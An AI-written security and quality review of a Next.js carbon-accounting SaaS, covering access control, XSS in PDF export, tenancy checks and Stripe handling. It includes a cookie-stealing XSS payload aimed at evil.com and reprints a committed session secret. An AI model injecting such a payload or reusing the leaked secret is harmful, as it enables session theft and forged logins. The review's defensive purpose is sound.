# Carbonly — Comprehensive Technical Review

**Date:** 2026-04-20  
**Reviewer:** Claude (gsd-code-reviewer)  
**Depth:** Deep (cross-file analysis)  
**Stack:** Next.js 16 App Router · TypeScript · MUI · Bootstrap 5 · Prisma (PostgreSQL) · NextAuth v5 · Stripe · Recharts

---

## Executive Summary

Carbonly is a well-structured multi-tenant SaaS application with a clean architecture. The route-group layout, Prisma schema, and calculation engine are all solid foundations. However, there are **three critical security issues** that must be fixed before a production launch: the admin panel lacks role enforcement at the route/API level, the HTML PDF export is vulnerable to stored XSS, and the `NEXTAUTH_SECRET` is committed to the repository. A further set of high-severity issues covers missing cross-tenant validation on emission record creation, unchecked `parseInt` return values in query-driven DB calls, and the JWT callback hitting the database on every single token refresh.

---

## 1. Architecture

### What Works Well

- Route groups (`(auth)`, `(dashboard)`, `(admin)`) provide a clean separation of layouts without URL path coupling.
- Server Components are used correctly for all data-fetching pages; `"use client"` boundary is pushed to leaf components.
- The dual-Drawer pattern in `(dashboard)/layout.tsx` (permanent desktop, temporary mobile) is correct MUI usage.
- MUI + Bootstrap coexist without conflict: MUI owns the shell chrome, Bootstrap grid classes (`row`, `col-md-*`) are used only for content-area layouts — a pragmatic split that works fine.
- `AppRouterCacheProvider` with `prepend: true` in `theme-provider.tsx` is the correct MUI SSR setup for Next.js 15+.

### Issues

#### CRITICAL — Admin layout is a client-side `"use client"` component with no server-enforced role guard
**File:** `src/app/(admin)/layout.tsx`  
**Lines:** 1–71

The admin layout is marked `"use client"` and uses `useSession()` + a `useEffect` to check authentication. This approach has two serious flaws:

1. **There is no `SUPER_ADMIN` role check anywhere.** The layout only checks `status === "unauthenticated"` — any authenticated user who navigates directly to `/admin/*` will see the admin panel.
2. **Client-side redirects are race-condition-prone.** Between the first render and the `useEffect` firing, the admin UI tree renders briefly for unauthenticated users, and more importantly, for users who are not `SUPER_ADMIN`.

The middleware (`src/middleware.ts` / `src/lib/auth/auth.config.ts`) explicitly states "Demo mode: any authenticated user may view /admin" — this comment indicates the guard was intentionally removed, but it represents a critical access-control gap.

**Fix:** Replace the client layout with a server component that enforces the role:

```typescript
// src/app/(admin)/layout.tsx  (server component — remove "use client")
import { auth } from "@/lib/auth/auth";
import { redirect } from "next/navigation";

export default async function AdminLayout({ children }: { children: React.ReactNode }) {
  const session = await auth();
  if (!session?.user) redirect("/login");
  if (session.user.globalRole !== "SUPER_ADMIN") redirect("/dashboard");
  // ... render shell
}
```

Additionally, update `src/lib/auth/auth.config.ts` to block `/admin` at the middleware edge:

```typescript
if (pathname.startsWith("/admin")) {
  return auth?.user?.globalRole === "SUPER_ADMIN";
}
```

---

#### HIGH — All admin API routes only check `session?.user` exists, not `SUPER_ADMIN` role
**Files:**  
- `src/app/api/admin/emission-factors/route.ts` line 6  
- `src/app/api/admin/emission-factors/[id]/route.ts` lines 8, 42  
- `src/app/api/admin/activities/route.ts` line 6  
- `src/app/api/admin/activities/[id]/route.ts` lines 8, 30  
- `src/app/api/admin/users/route.ts` line 7  
- `src/app/api/admin/users/[id]/route.ts` lines 8, 26  
- `src/app/api/admin/entities/route.ts` line 10  
- `src/app/api/admin/entities/[id]/route.ts` lines 8, 30  

Every admin API route guards with `if (!session?.user)` — this permits any authenticated user (including `EXPERT` role tenants) to create/update/delete emission factors, activities, users, and entities via the API.

**Fix:** Add a role check helper and use it in every admin route:

```typescript
// In each admin route handler:
const session = await auth();
if (session?.user?.globalRole !== "SUPER_ADMIN") {
  return NextResponse.json({ error: "Forbidden" }, { status: 403 });
}
```

---

#### MEDIUM — Dashboard pages use non-null assertions (`!`) on `session` without any guard
**Files:**  
- `src/app/(dashboard)/dashboard/page.tsx` line 113  
- `src/app/(dashboard)/emissions/page.tsx` lines 31, 38  
- `src/app/(dashboard)/scope/[scopeNumber]/page.tsx` lines 79–80  
- `src/app/(dashboard)/reports/page.tsx` line 12  
- `src/app/(dashboard)/settings/page.tsx` lines 66, 70, 72  

All dashboard pages call `session!.user.entityId!` (double non-null assertion). The middleware/layout redirect is supposed to guarantee session presence, but if there is any ordering inconsistency (e.g., middleware config changes), these will throw `TypeError: Cannot read properties of null` rather than redirecting gracefully.

**Fix:** Use early returns at the top of each page:

```typescript
const session = await auth();
if (!session?.user?.entityId) redirect("/login");
```

---

## 2. Authentication & Security

### What Works Well

- `auth.config.ts` is correctly split from `auth.ts` for edge-safe middleware usage (no Prisma in the middleware bundle).
- `bcrypt` with cost factor 10 is used correctly for password hashing.
- JWT strategy with `PrismaAdapter` is a valid combination; session data stays server-side.
- Stripe webhook signature verification (`stripe.webhooks.constructEvent`) is correctly implemented.
- The registration endpoint validates email format and minimum password length via Zod.

### Issues

#### CRITICAL — `NEXTAUTH_SECRET` is committed to the repository
**File:** `.env`  
**Line:** 5

The file `.env` (not `.env.local`) contains a real, non-placeholder `NEXTAUTH_SECRET` value:

```
NEXTAUTH_SECRET="VW6L5/GgGGF3K5AWf/0aiJ5vEHDJL7C+QzKJDX/GCi4="
```

If this repository is or ever becomes public, all JWT sessions can be forged. Even in a private repo, committing secrets to version control is a security anti-pattern.

**Fix:**  
1. Rotate the secret immediately.  
2. Add `.env` to `.gitignore`. Only `.env.local` (which is already gitignored by Next.js) should hold real values.  
3. Use `.env.local.example` (which already exists) as the only committed env file.

---

#### CRITICAL — PDF export HTML is built by string-interpolating DB values without escaping (Stored XSS → arbitrary code execution in Puppeteer)
**File:** `src/app/api/reports/[reportId]/export/route.ts`  
**Lines:** 75, 94, 107, 257, 259, 340, 391

The `buildReportHtml()` function interpolates values from the `summary` JSON column directly into HTML using template literals:

```typescript
<title>${report.title}</title>
<h1>${report.title}</h1>
<td>${a.name}</td>   // activity name from DB
${s.entityName}       // entity name from DB
```

`report.title` is composed from `entity.name` (line 152 of `reports/route.ts`): `"${entity?.name ?? 'Organisation'} — GHG Emissions Report ${year}"`. An entity name like `<script>fetch('https://evil.com?c='+document.cookie)</script>` stored by an admin would be rendered unescaped into the HTML page, and then parsed by Puppeteer's Chromium instance which runs with `--no-sandbox`. In a sandboxed server-side renderer this is especially dangerous.

**Fix:** Add an HTML escape function and use it on all user-controlled values:

```typescript
function escapeHtml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

// Then:
<title>${escapeHtml(report.title)}</title>
<h1>${escapeHtml(report.title)}</h1>
<td>${escapeHtml(a.name)}</td>
```

---

#### HIGH — JWT callback hits the database on every token refresh
**File:** `src/lib/auth/auth.ts`  
**Lines:** 55–65

```typescript
async jwt({ token, user }) {
  if (user) {
    token.globalRole = (user as { globalRole: GlobalRole }).globalRole;
  }
  // Always refresh entity membership from DB on token refresh
  if (token.sub) {
    const membership = await prisma.userEntity.findFirst({
      where: { userId: token.sub },
      include: { entity: true },
    });
    ...
  }
  return token;
}
```

The comment says "always refresh" — this runs a DB query on every single JWT validation, which occurs on every authenticated request (NextAuth re-validates the JWT each call to `auth()`). With many concurrent users this will cause connection pool pressure and latency spikes.

**Fix:** Only query on initial sign-in (when `user` is present), and refresh on explicit trigger (e.g., store a `lastRefreshed` timestamp in the token and re-query only after a TTL):

```typescript
async jwt({ token, user, trigger }) {
  if (user) {
    token.globalRole = (user as { globalRole: GlobalRole }).globalRole;
    // Load entity on initial sign-in only
    const membership = await prisma.userEntity.findFirst({
      where: { userId: user.id! },
      include: { entity: true },
    });
    if (membership) {
      token.entityId = membership.entityId;
      token.entitySlug = membership.entity.slug;
      token.entityRole = membership.role;
    }
  }
  // Re-fetch on explicit session update
  if (trigger === "update") {
    // re-query here
  }
  return token;
}
```

---

#### HIGH — Google OAuth provider is configured with non-null assertion on potentially empty env vars
**File:** `src/lib/auth/auth.ts`  
**Lines:** 14–17

```typescript
GoogleProvider({
  clientId: process.env.GOOGLE_CLIENT_ID!,
  clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
}),
```

The `.env` file has these as empty strings. NextAuth v5 will attempt to register the Google provider with empty `clientId`/`clientSecret`, causing OAuth flows to fail with confusing errors rather than a clear startup failure. The `!` assertion suppresses TypeScript's protection here.

**Fix:** Guard the provider registration:

```typescript
...(process.env.GOOGLE_CLIENT_ID && process.env.GOOGLE_CLIENT_SECRET
  ? [GoogleProvider({
      clientId: process.env.GOOGLE_CLIENT_ID,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    })]
  : []),
```

---

#### MEDIUM — Missing `DIRECT_URL` in `prisma/schema.prisma` and `.env`
**File:** `prisma/schema.prisma` line 6; `.env`

The `CLAUDE.md` documentation lists `DIRECT_URL` as required, and `.env.local.example` defines it. However, `prisma/schema.prisma` does not include `directUrl = env("DIRECT_URL")` in the datasource block, and `.env` does not define it. When using a connection pooler (e.g., PgBouncer or Supabase), Prisma migrations will fail because they require a direct connection bypassing the pooler.

**Fix:**

```prisma
datasource db {
  provider  = "postgresql"
  url       = env("DATABASE_URL")
  directUrl = env("DIRECT_URL")
}
```

---

## 3. Multi-Tenancy & Data Isolation

### What Works Well

- All dashboard query pages correctly filter by `entityId` from the session JWT.
- Report CRUD (`DELETE`, `PATCH`) correctly verifies `report.entityId === session.user.entityId` before acting.
- The `EmissionRecord` model has `@@index([entityId, year])` and `@@index([entityId, activityId])` — correct for the query patterns used.

### Issues

#### CRITICAL — `POST /api/emissions` does not verify that `activityId` and `emissionFactorId` belong to the calling entity's scope
**File:** `src/app/api/emissions/route.ts`  
**Lines:** 39–49

The POST handler looks up the emission factor by ID and uses its value for calculation, but never verifies:
1. That `activityId` is a real, active activity.
2. That `emissionFactorId` belongs to `activityId`.
3. That the selected factor/activity is accessible to the tenant (not a `yearlyConfigId`-restricted factor from another entity's `YearlyConfig`).

An authenticated user can submit any `activityId`/`emissionFactorId` UUID (guessed or obtained from the admin panel or other tenants) and create an emission record referencing taxonomy entries they should not control.

```typescript
// Current code:
const factor = await prisma.emissionFactor.findUnique({
  where: { id: emissionFactorId },
});
// No check that factor.activityId === activityId
// No check that factor belongs to tenant or is a global factor
```

**Fix:** Validate the relationship:

```typescript
const factor = await prisma.emissionFactor.findFirst({
  where: {
    id: emissionFactorId,
    activityId,           // must match the submitted activityId
    OR: [
      { yearlyConfigId: null },  // global factor
      {
        yearlyConfig: {
          entityId: session.user.entityId,  // or entity-specific
        },
      },
    ],
  },
});
if (!factor) {
  return NextResponse.json({ error: "Invalid activity/factor combination" }, { status: 400 });
}
```

---

#### HIGH — `parseInt` on query-string `year` and `page` is unchecked for `NaN`
**Files:**  
- `src/app/(dashboard)/dashboard/page.tsx` line 112  
- `src/app/(dashboard)/emissions/page.tsx` lines 25–26  
- `src/app/api/emissions/route.ts` line 14  

`parseInt("abc")` returns `NaN`. `NaN` passed to Prisma's `where: { year: NaN }` will silently produce zero results rather than throwing. More dangerously, `skip: (NaN - 1) * 20` evaluates to `skip: NaN`, which Prisma rejects with a runtime error (500).

```typescript
// dashboard/page.tsx line 112:
const year = parseInt(params.year ?? "2024");
// If params.year = "abc", year = NaN → getDashboardData(entityId, NaN)

// emissions/page.tsx line 26:
const page = parseInt(params.page ?? "1");
// skip: (NaN - 1) * 20 = NaN → Prisma throws
```

**Fix:**

```typescript
const rawYear = parseInt(params.year ?? "");
const year = Number.isFinite(rawYear) && rawYear >= 2000 && rawYear <= 2100
  ? rawYear
  : new Date().getFullYear();

const rawPage = parseInt(params.page ?? "");
const page = Number.isFinite(rawPage) && rawPage >= 1 ? rawPage : 1;
```

---

#### MEDIUM — Report generation uses hardcoded 2021 as baseline year
**File:** `src/app/api/reports/route.ts`  
**Lines:** 53–65; `src/app/(dashboard)/dashboard/page.tsx` lines 27–31

The baseline year `2021` is hardcoded in three separate places. The schema already has `YearlyConfig.baselineYear: Boolean` for this purpose, but it is never read in the report or dashboard logic.

**Fix:** Query the entity's baseline year from `YearlyConfig` instead of hardcoding:

```typescript
const baselineConfig = await prisma.yearlyConfig.findFirst({
  where: { entityId, baselineYear: true },
});
const baselineYear = baselineConfig?.year ?? 2021;
```

---

## 4. Calculation Engine

### What Works Well

- `src/lib/calculator/engine.ts` is correctly pure: no imports, no I/O, no side effects.
- `calculate()` is the single entry point; the per-scope functions (`calculateScope1/2/3`) correctly delegate to it — no duplicated logic.
- `aggregateTotals()` re-derives `co2eT` from `totalCo2eKg` rather than summing the already-rounded `co2eT` values, which is the correct approach to minimise rounding accumulation.
- The API route (`POST /api/emissions`) correctly calls `calculate()` from the engine rather than computing inline.

### Issues

#### LOW — `calculate()` does not guard against non-finite inputs
**File:** `src/lib/calculator/engine.ts`  
**Lines:** 19–25

If `quantity` is `Infinity`, `-Infinity`, or `NaN` (possible if a client bypasses the Zod schema), the function returns `{ co2eKg: NaN, co2eT: NaN }` or `{ co2eKg: Infinity, co2eT: Infinity }`, which would be silently stored in the database.

The Zod schema (`z.number().positive()`) prevents this for the `/api/emissions` route, but since `engine.ts` is documented as reusable, it should defend itself:

```typescript
export function calculate(input: CalculationInput): CalculationResult {
  if (!Number.isFinite(input.quantity) || !Number.isFinite(input.emissionFactorValue)) {
    throw new Error("Inputs must be finite numbers");
  }
  if (input.quantity < 0 || input.emissionFactorValue < 0) {
    throw new Error("Inputs must be non-negative");
  }
  // ...
}
```

---

#### LOW — `aggregateTotals` accumulates floating-point error across large record sets
**File:** `src/lib/calculator/engine.ts`  
**Lines:** 54–62

The function sums already-rounded `co2eKg` values:

```typescript
const totalCo2eKg = records.reduce((sum, r) => sum + r.co2eKg, 0);
```

Each `r.co2eKg` has been rounded to 3 decimal places already. Summing hundreds of these introduces cumulative rounding error. For GHG reporting, the correct approach is to sum `quantity × factor` for each record and round only at the aggregate level — but this requires passing raw inputs rather than results to `aggregateTotals`. This is a low-priority concern for typical SMB record counts, but worth noting for regulatory audit contexts.

---

## 5. API Routes

### What Works Well

- Zod validation is used consistently on the emissions POST route.
- The emissions GET route uses `entityId` from the session, never from the query string.
- Report `DELETE`/`PATCH` correctly verify ownership before mutating.
- The Stripe checkout route creates a Stripe customer idempotently (checks for existing `stripeCustomerId`).
- Admin activity/factor deletion correctly checks for dependent records before deleting.

### Issues

#### HIGH — `POST /api/reports` has a hardcoded baseline year (see §3 above) and no role check
**File:** `src/app/api/reports/route.ts`  
**Line:** 23

Only `entityId` is checked; no minimum role (`EXPERT` or `ADMIN`) is required to generate a report. While all dashboard users have an `entityId`, the original intent (see CLAUDE.md role table) suggests report generation should be restricted. More critically, the hardcoded baseline year creates a data quality regression (see §3 Medium issue above).

---

#### MEDIUM — `POST /api/reports` accepts `year` from raw JSON without type validation
**File:** `src/app/api/reports/route.ts`  
**Line:** 29

```typescript
const { year } = (await req.json()) as { year: number };
if (!year || year < 2000 || year > 2100) { ... }
```

The `as { year: number }` cast is a TypeScript assertion, not a runtime check. If the client sends `{ "year": "2024" }` (a string), `year < 2000` will evaluate as `"2024" < 2000` → `false` (JavaScript type coercion), and `year` will be passed as a string to Prisma's `where: { year }`, causing a type error. Use Zod:

```typescript
import { z } from "zod";
const bodySchema = z.object({ year: z.number().int().min(2000).max(2100) });
const parsed = bodySchema.safeParse(await req.json());
if (!parsed.success) return NextResponse.json({ error: "Invalid year" }, { status: 400 });
const { year } = parsed.data;
```

---

#### MEDIUM — Admin user creation exposes `passwordHash` in the API response
**File:** `src/app/api/admin/users/route.ts`  
**Line:** 40

```typescript
const user = await prisma.user.create({ data: { ... } });
return NextResponse.json(user, { status: 201 });
```

`prisma.user.create()` returns the full `User` model, which includes `passwordHash`. This is sent back to the client in the response body. While admin UI consumers do not display it, it is unnecessary data exposure.

**Fix:**

```typescript
const user = await prisma.user.create({
  data: { ... },
  select: { id: true, email: true, name: true, globalRole: true, createdAt: true },
});
```

---

#### LOW — `PATCH /api/reports/[reportId]` accepts an empty body with no changes and returns 200
**File:** `src/app/api/reports/[reportId]/route.ts`  
**Lines:** 35–53

If `body.status` is undefined, the `prisma.report.update()` is called with `data: {}` — an empty update that still performs a DB write and returns the record. While harmless, it wastes a DB round-trip and is semantically incorrect (a no-op should return 204 or the existing record without a write).

---

#### LOW — Stripe `invoice.payment_failed` may not contain a `customer` field for all invoice types
**File:** `src/app/api/webhooks/stripe/route.ts`  
**Line:** 49

The Stripe `Invoice` type in newer API versions returns `customer` as `string | Stripe.Customer | Stripe.DeletedCustomer | null`. Casting it directly as `string` can fail silently if Stripe expands the object. Access via `typeof invoice.customer === 'string' ? invoice.customer : invoice.customer?.id`.

---

## 6. Frontend

### What Works Well

- `ScopeCalculator` correctly uses `react-hook-form` with `zodResolver` to mirror the server schema validation.
- The `"use client"` / server component boundary is clean: data fetching in server components, interactivity in client components.
- The calculator's `onSubmit` correctly relies on the API for the calculation result rather than computing on the client.
- Pagination in `EmissionsPage` is server-side (uses `skip`/`take`), avoiding loading all records.

### Issues

#### MEDIUM — `ScopeCalculator` receives `entityId` and `userId` as props but never uses them
**File:** `src/components/calculator/scope-calculator.tsx`  
**Lines:** 26–29, 31

```typescript
type Props = {
  scope: Scope;
  entityId: string;  // ← declared
  userId: string;    // ← declared
};

export function ScopeCalculator({ scope }: Props) {  // ← both ignored
```

These props are passed from the server page (`scope/[scopeNumber]/page.tsx` lines 79–80) but destructured away. This is dead code and creates confusion about the component's intended API. The entity/user context is correctly sourced from the session server-side, so these props should be removed from the type and the call site.

---

#### MEDIUM — `ScopeCalculator` does not reset the form after a successful submission
**File:** `src/components/calculator/scope-calculator.tsx`  
**Lines:** 53–68

After a successful save, `saved` is set to `true` and the result is shown, but the form fields retain their values. A second submit with the same values will create a duplicate emission record. There is no "Add another" pattern or form reset.

**Fix:** Call `reset()` from `react-hook-form` after success:

```typescript
const { register, handleSubmit, watch, reset, formState: { errors } } = useForm<CreateEmissionInput>({...});

// in onSubmit:
if (res.ok) {
  setResult({ co2eKg: json.co2eKg, co2eT: json.co2eT });
  setSaved(true);
  reset();  // clear form fields
}
```

---

#### MEDIUM — Calculator form error handling is silent on API errors
**File:** `src/components/calculator/scope-calculator.tsx`  
**Lines:** 53–68

```typescript
const onSubmit = async (data: CreateEmissionInput) => {
  setSaving(true);
  try {
    const res = await fetch("/api/emissions", { ... });
    const json = await res.json();
    if (res.ok) {
      setResult({ co2eKg: json.co2eKg, co2eT: json.co2eT });
      setSaved(true);
    }
    // ← no else branch: API errors are swallowed silently
  } finally {
    setSaving(false);
  }
};
```

If the API returns a 400 or 500, the user sees nothing — the button just stops spinning. Add an error state:

```typescript
const [error, setError] = useState<string | null>(null);

if (res.ok) { ... }
else {
  const { error: msg } = await res.json();
  setError(msg ?? "Failed to save. Please try again.");
}
```

---

#### LOW — Dashboard year is hardcoded to `"2024"` as default
**File:** `src/app/(dashboard)/dashboard/page.tsx`  
**Line:** 112

```typescript
const year = parseInt(params.year ?? "2024");
```

The default should be the current year (`new Date().getFullYear()`), not a hardcoded `"2024"`. This will produce an empty dashboard for new users in 2025+.

---

#### LOW — `BillingSection.openPortal` silently swallows all errors
**File:** `src/components/settings/billing-section.tsx`  
**Lines:** 36–47

```typescript
async function openPortal() {
  try { ... }
  catch {
    // fall through — user sees nothing
  }
}
```

Add user feedback on failure.

---

## 7. Stripe Integration

### What Works Well

- The Stripe client uses lazy initialization via `getStripe()`, avoiding startup failures when `STRIPE_SECRET_KEY` is absent.
- The `Proxy`-based `stripe` named export is a clever backward-compat approach.
- The webhook correctly uses `req.text()` (not `req.json()`) for signature verification.
- `subscription.metadata.entityId` is stored on the subscription for traceability.

### Issues

#### HIGH — Plan key/price mapping is split between two files and is inconsistent
**Files:** `src/lib/stripe/client.ts` and `src/lib/stripe/plans.ts`

`client.ts` defines `STRIPE_PLANS` with keys `STARTER`, `PROFESSIONAL`, `ENTERPRISE` and reads `STRIPE_PRICE_STARTER`, `STRIPE_PRICE_PROFESSIONAL`, `STRIPE_PRICE_ENTERPRISE`.

`plans.ts` defines `PLANS` with lowercase keys (`starter`, `professional`, `enterprise`) and reads the same env vars via `priceEnvKey` strings.

The checkout route uses `plans.ts`; `client.ts`'s `STRIPE_PLANS` appears unused. Having two parallel plan registries risks them diverging. Remove `STRIPE_PLANS` from `client.ts` entirely.

---

#### MEDIUM — Checkout route trusts the `origin` header for success/cancel URLs
**File:** `src/app/api/stripe/checkout/route.ts`  
**Lines:** 49, 59–60

```typescript
const origin = req.headers.get("origin") ?? process.env.NEXTAUTH_URL;
// ...
success_url: `${origin}/dashboard?upgraded=1`,
cancel_url:  `${origin}/pricing?canceled=1`,
```

The `Origin` header can be spoofed or missing. If missing, it falls back to `NEXTAUTH_URL`, which is good — but the fallback should always be used for the Stripe URLs. A crafted request with `Origin: https://evil.com` would cause Stripe to redirect to the attacker's domain after checkout, enabling phishing.

**Fix:** Always use the configured base URL:

```typescript
const baseUrl = process.env.NEXTAUTH_URL ?? "http://localhost:3000";
success_url: `${baseUrl}/dashboard?upgraded=1`,
cancel_url:  `${baseUrl}/pricing?canceled=1`,
```

---

#### MEDIUM — Webhook does not handle `invoice.payment_succeeded` to re-activate `PAST_DUE` subscriptions
**File:** `src/app/api/webhooks/stripe/route.ts`

When a payment fails, status is set to `PAST_DUE`. When the customer pays the overdue invoice, Stripe fires `invoice.payment_succeeded`. Without handling this event, the entity remains `PAST_DUE` in the database even after payment, locking them out of paid features.

**Fix:** Add a handler:

```typescript
case "invoice.payment_succeeded": {
  const invoice = event.data.object as Stripe.Invoice;
  if (invoice.billing_reason === "subscription_cycle" || invoice.billing_reason === "subscription_update") {
    await prisma.entity.updateMany({
      where: { stripeCustomerId: invoice.customer as string },
      data: { subscriptionStatus: "ACTIVE" },
    });
  }
  break;
}
```

---

## 8. Data Model

### What Works Well

- `UserEntity` junction table correctly enforces `@@unique([userId, entityId])`, preventing duplicate memberships.
- `EmissionRecord` denormalises `year` and `month` for fast aggregation — correct and consistent with the API usage.
- Cascade deletes are configured appropriately (entity delete cascades to records, reports, etc.).
- `YearlyConfig` design correctly supports entity-specific emission factor overrides scoped to a calendar year.

### Issues

#### MEDIUM — `EmissionFactor.yearlyConfigId` is nullable with no constraint preventing a factor from being shared across `YearlyConfig` and globally at the same time
**File:** `prisma/schema.prisma`  
**Lines:** 157–173

A factor with `yearlyConfigId = null` is a "global" platform factor. A factor with `yearlyConfigId = X` is entity-specific. The schema permits updating a global factor's `yearlyConfigId` to point to any `YearlyConfig`, including another entity's. The API does not validate this. Combined with the missing SUPER_ADMIN guard on admin routes (Issue §1), any authenticated user could call `PATCH /api/admin/emission-factors/:id` to reassign a global factor to their own `YearlyConfig`.

---

#### LOW — `Report.summary` is typed as `Json?` with no schema enforcement
**File:** `prisma/schema.prisma` line 218

The `summary` JSON column is cast to `unknown as ReportSummary` in the export route. If the summary shape changes (e.g., a field is added to the report generation logic), old reports will have stale schemas. Consider adding a `summaryVersion` int column to handle migrations gracefully.

---

#### LOW — No index on `EmissionRecord.year` + `month` for monthly aggregation queries
**File:** `prisma/schema.prisma`  
**Lines:** 198–200

The dashboard and report routes filter by `{ entityId, year }` (covered) and then filter monthly records in application code (`records.filter(r => r.month === i + 1)`). An index on `(entityId, year, month)` would allow the DB to handle the monthly aggregation:

```prisma
@@index([entityId, year, month])
```

---

## 9. Code Quality

### What Works Well

- Consistent use of `safeParse` from Zod (never the throwing `parse`).
- No raw SQL or `$queryRaw` usage — all DB access through Prisma.
- The Prisma singleton pattern in `src/lib/db/prisma.ts` is correct for Next.js dev hot-reload.
- `escapeCSV` in the export route correctly handles commas, quotes, and newlines.

### Issues

#### MEDIUM — Admin pages (`/admin/page.tsx`) fetch all entities without pagination
**File:** `src/app/(admin)/admin/page.tsx`  
**Line:** 27

```typescript
prisma.entity.findMany({
  include: { _count: { select: { users: true, emissionRecords: true } } },
  orderBy: { createdAt: "desc" },
}),
```

No `take` limit. With a large number of tenants this will load all of them into memory. Apply `take: 50` and add pagination.

---

#### MEDIUM — `src/app/(admin)/admin/page.tsx` also fetches all `recentRecords` cross-tenant with no entityId filter
**File:** `src/app/(admin)/admin/page.tsx`  
**Lines:** 34–37

```typescript
prisma.emissionRecord.findMany({
  orderBy: { createdAt: "desc" }, take: 5,
  include: { entity: true, activity: true, user: true },
}),
```

This is intentional for the admin overview (cross-tenant), which is fine if the admin role guard is enforced (see Critical Issue §1). This note is to confirm the behaviour is intentional and will be safe once the role guard is added.

---

#### LOW — `src/app/(admin)/admin/page.tsx` imports `export const dynamic` after the `import type` statement
**File:** `src/app/(admin)/admin/page.tsx`  
**Lines:** 1–6

```typescript
import type { Metadata } from "next";
export const dynamic = "force-dynamic";
import { prisma } from "...";
```

`export const dynamic` should be declared before any imports, or at least consistently at the top. While this works in practice (JS module hoisting does not apply to `const`), it is a Next.js convention to declare route segment configs at the top of the file.

---

#### LOW — Seed script hardcodes demo credentials in plaintext output
**File:** `prisma/seed.ts`  
**Lines:** 268–269

```typescript
console.log("  Admin:  admin@carbonly.io / admin1234");
console.log("  Expert: expert@acme-corp.com / expert1234");
```

This is acceptable for local dev seeds. Ensure the seed script is never run in production environments, and consider using `process.env.NODE_ENV` guard:

```typescript
if (process.env.NODE_ENV !== "production") {
  console.log("  Admin:  admin@carbonly.io / admin1234");
}
```

---

## Summary Table

| # | Severity | Area | File | Issue |
|---|----------|------|------|-------|
| 1 | **Critical** | Auth/AuthZ | `(admin)/layout.tsx` | Admin panel accessible to all authenticated users — no SUPER_ADMIN role check |
| 2 | **Critical** | Auth/AuthZ | All `api/admin/*` routes | Admin APIs only check login, not SUPER_ADMIN role |
| 3 | **Critical** | Security | `.env` | NEXTAUTH_SECRET committed to the repository |
| 4 | **Critical** | Security | `api/reports/[reportId]/export/route.ts:75,94,107,257` | Stored XSS via unescaped user data in Puppeteer HTML |
| 5 | **Critical** | Multi-Tenancy | `api/emissions/route.ts:39` | No validation that emissionFactorId belongs to activityId; cross-entity factor injection |
| 6 | **High** | Auth | `lib/auth/auth.ts:55` | JWT callback queries DB on every request |
| 7 | **High** | Auth | `lib/auth/auth.ts:14` | Google OAuth provider registered with empty strings via `!` assertion |
| 8 | **High** | Input Validation | `(dashboard)/dashboard/page.tsx:112`, `emissions/page.tsx:25` | `parseInt` result not checked for `NaN` → crash or silent empty data |
| 9 | **High** | Stripe | `api/stripe/checkout/route.ts:49` | `Origin` header trusted for Stripe redirect URLs — open redirect risk |
| 10 | **High** | Stripe | `api/webhooks/stripe/route.ts` | `invoice.payment_succeeded` not handled — PAST_DUE entities never re-activated |
| 11 | **High** | API | All `api/admin/*` | (duplicate of #2 — role check missing) |
| 12 | **Medium** | Auth | `prisma/schema.prisma:6` | Missing `directUrl` in datasource — migrations will fail with connection poolers |
| 13 | **Medium** | Multi-Tenancy | `api/reports/route.ts:53` | Baseline year hardcoded as `2021`; ignores `YearlyConfig.baselineYear` |
| 14 | **Medium** | API | `api/reports/route.ts:29` | `year` accepted via unsafe TypeScript cast, not Zod validation |
| 15 | **Medium** | Security | `api/admin/users/route.ts:40` | `passwordHash` returned in user creation API response |
| 16 | **Medium** | Frontend | `calculator/scope-calculator.tsx:31` | `entityId`/`userId` props declared but ignored (dead code) |
| 17 | **Medium** | Frontend | `calculator/scope-calculator.tsx:53` | Form not reset after save; silent failure on API error |
| 18 | **Medium** | Stripe | `lib/stripe/client.ts` | Duplicate plan registry (`STRIPE_PLANS`) diverging from `plans.ts` |
| 19 | **Medium** | Dashboard | `(dashboard)/dashboard/page.tsx:112` | Default year hardcoded to `"2024"` instead of current year |
| 20 | **Medium** | Dashboard | `(admin)/admin/page.tsx:27` | All entities fetched without pagination |
| 21 | **Low** | Calculation | `lib/calculator/engine.ts:19` | No guard against `NaN`/`Infinity` inputs |
| 22 | **Low** | Data Model | `prisma/schema.prisma` | No `(entityId, year, month)` compound index for monthly aggregation |
| 23 | **Low** | API | `api/reports/[reportId]/route.ts:47` | Empty PATCH body still issues DB write |
| 24 | **Low** | API | `api/webhooks/stripe/route.ts:49` | `invoice.customer` cast as string without narrowing |
| 25 | **Low** | Code Quality | `prisma/seed.ts:268` | Plaintext credentials in seed output |
| 26 | **Low** | Code Quality | `lib/utils/format.ts` | `formatCO2e` appends the unit label within the number string, making it unsuitable for numeric comparisons |

---

## Recommended Action Order

1. **Immediately:** Rotate `NEXTAUTH_SECRET`, move it to `.env.local` only, add `.env` to `.gitignore`.
2. **Before any production traffic:** Add `SUPER_ADMIN` check to `auth.config.ts` middleware + convert admin layout to server component + add role guard to all admin API routes.
3. **Before any production traffic:** Add `escapeHtml()` to all user-controlled values in `buildReportHtml()`.
4. **Before any production traffic:** Add cross-entity validation on `POST /api/emissions` (verify factor belongs to activity).
5. **Before launch:** Fix `parseInt` NaN handling, add `invoice.payment_succeeded` webhook handler, fix Stripe redirect URL to use `NEXTAUTH_URL`.
6. **Backlog:** JWT DB-query-per-request optimisation, hardcoded baseline year, missing `directUrl`, form reset/error UX improvements.

---

_Reviewed: 2026-04-20_  
_Reviewer: Claude (gsd-code-reviewer)_  
_Depth: deep_
